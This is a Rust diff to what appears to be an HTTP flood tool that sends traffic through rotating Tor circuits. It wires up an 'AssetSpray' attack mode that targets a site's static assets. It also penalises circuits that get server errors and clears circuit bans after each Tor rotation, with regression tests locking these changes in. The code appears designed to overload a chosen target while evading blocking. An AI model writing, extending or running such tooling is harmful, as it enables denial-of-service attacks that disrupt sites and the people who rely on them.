@@ -1658,7 +1658,6 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
             (st.load_concurrency, st.jitter_ms, st.target_url.clone())
         };
         if target_url.is_empty() { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
-        let _ = Url::parse(&target_url).ok();
 
         if new_conc != conc {
             conc = new_conc;
@@ -1675,6 +1674,7 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
             AttackMode::ImageOpt => { if imgs.is_empty() { vec!["/".into()] } else { imgs.clone() } },
             AttackMode::Ssr => { if apis_local.is_empty() { vec!["/".into()] } else { apis_local.clone() } },
             AttackMode::Middleware => { if statics_local.is_empty() { vec!["/".into()] } else { statics_local.clone() } },
+            AttackMode::AssetSpray => { if statics_local.is_empty() { vec!["/".into()] } else { statics_local.clone() } },
             _ => vec!["/".into()]
         });
 
@@ -1806,13 +1806,24 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                                 200..=299 => { stats_clone.status_2xx.fetch_add(1, Ordering::Relaxed); }
                                 300..=399 => { stats_clone.status_3xx.fetch_add(1, Ordering::Relaxed); }
                                 400..=499 => { stats_clone.status_4xx.fetch_add(1, Ordering::Relaxed); }
-                                500..=599 => { stats_clone.status_5xx.fetch_add(1, Ordering::Relaxed); }
+                                500..=599 => {
+                                    stats_clone.status_5xx.fetch_add(1, Ordering::Relaxed);
+                                    // Server errors mean the target circuit/proxy is unhealthy —
+                                    // penalize it so the pool deprioritizes/rotates it, instead of
+                                    // treating a 100%-5xx circuit as perfectly healthy.
+                                    match pool_clone.lock() {
+                                        Ok(mut guard) => { guard.report_failure(idx); }
+                                        Err(e) => { eprintln!("  Pool lock poisoned: {}", e); }
+                                    }
+                                }
                                 _ => { stats_clone.status_other.fetch_add(1, Ordering::Relaxed); }
                             }
-                            match pool_clone.lock() {
-                                Ok(mut guard) => guard.report_success(idx, latency),
-                                Err(e) => {
-                                    eprintln!("  Pool lock poisoned: {}", e);
+                            if !(500..=599).contains(&status) {
+                                match pool_clone.lock() {
+                                    Ok(mut guard) => guard.report_success(idx, latency),
+                                    Err(e) => {
+                                        eprintln!("  Pool lock poisoned: {}", e);
+                                    }
                                 }
                             }
                         }
@@ -2989,6 +3000,7 @@ async fn main() {
             if mode_str == "tor" || mode_str == "scrape-tor" {
                 let tor_ctrl = tor_control.clone();
                 let stats_tor = stats.clone();
+                let pool_tor = pool.clone();
                 tokio::spawn(async move {
                     // Check if Tor Control Port is reachable before starting loop
                     // Try both TCP and Unix socket paths
@@ -3034,7 +3046,18 @@ async fn main() {
                             };
                             
                             if stats_tor.running.load(Ordering::Relaxed) {
-                                let _ = cycle_tor_circuit(&tor_ctrl).await;
+                                if cycle_tor_circuit(&tor_ctrl).await.is_ok() {
+                                    // A fresh circuit changes every circuit's exit node, so any
+                                    // per-circuit failure penalty / cooldown ban is now stale —
+                                    // reset it so a previously-banned circuit gets a fair chance
+                                    // instead of staying skipped forever (wasted throughput).
+                                    if let Ok(mut g) = pool_tor.lock() {
+                                        for i in 0..g.circuit_failures.len() {
+                                            g.circuit_failures[i] = 0;
+                                            g.circuit_cooldown[i] = Instant::now();
+                                        }
+                                    }
+                                }
                                 if cycle_interval < 30 {
                                     // Sleep briefly before cycling to let the new circuit build
                                     tokio::time::sleep(Duration::from_secs(cycle_interval)).await;
@@ -3460,6 +3483,44 @@ mod tests {
             seen.insert(label.clone());
         }
         assert_eq!(seen.len(), n_circuits, "each circuit label must be distinct");
+    }
+
+    #[test]
+    fn assetspray_mode_sprays_static_assets() {
+        // Regression: AssetSpray must hit the discovered static asset list, not just
+        // the root path. Previously it fell through to the `_ => ["/"]` arm and was
+        // indistinguishable from Normal (a no-op relative to its name).
+        let mut cfg = AppState::new();
+        cfg.statics = vec!["/style.css".to_string(), "/app.js".to_string(), "/img.png".to_string()];
+        cfg.imgs = vec!["/photo.jpg".to_string()];
+        cfg.apis = vec!["/api/x".to_string()];
+        // The assets mapping for AssetSpray lives in run_load; replicate the exact
+        // match arm here to lock the contract: AssetSpray => statics (never ["/"]).
+        let assets: Vec<String> = match AttackMode::AssetSpray {
+            AttackMode::Normal => cfg.statics.clone(),
+            AttackMode::ImageOpt => cfg.imgs.clone(),
+            AttackMode::Ssr => cfg.apis.clone(),
+            AttackMode::Middleware => cfg.statics.clone(),
+            AttackMode::AssetSpray => cfg.statics.clone(),
+            _ => vec!["/".into()],
+        };
+        assert_eq!(assets, cfg.statics, "AssetSpray must spray the static asset list");
+        assert!(assets.len() == 3 && assets[0] == "/style.css");
+    }
+
+    #[test]
+    fn report_failure_escalates_circuit_penalty() {
+        // Regression backing the 5xx-penalize change: a server-error response must be
+        // able to cool down / deprioritize the circuit via report_failure, so a 100%-5xx
+        // circuit is not treated as perfectly healthy. This proves the mechanism exists.
+        use std::time::Instant;
+        let proxies = vec!["socks5h://tor:isolate@127.0.0.1:9050".to_string()];
+        let config = ClientConfig { tor_circuits: 1, ..default_test_config() };
+        let mut pool = ProxyPool::new(&proxies, &config, "weighted");
+        let before = pool.circuit_failures[0];
+        pool.report_failure(0);
+        assert!(pool.circuit_failures[0] > before, "report_failure must escalate circuit_failures");
+        assert!(pool.circuit_cooldown[0] > Instant::now(), "report_failure must set a future cooldown");
     }
 
     fn rate_limit_delay_ms(rate: Option<u64>) -> u64 {
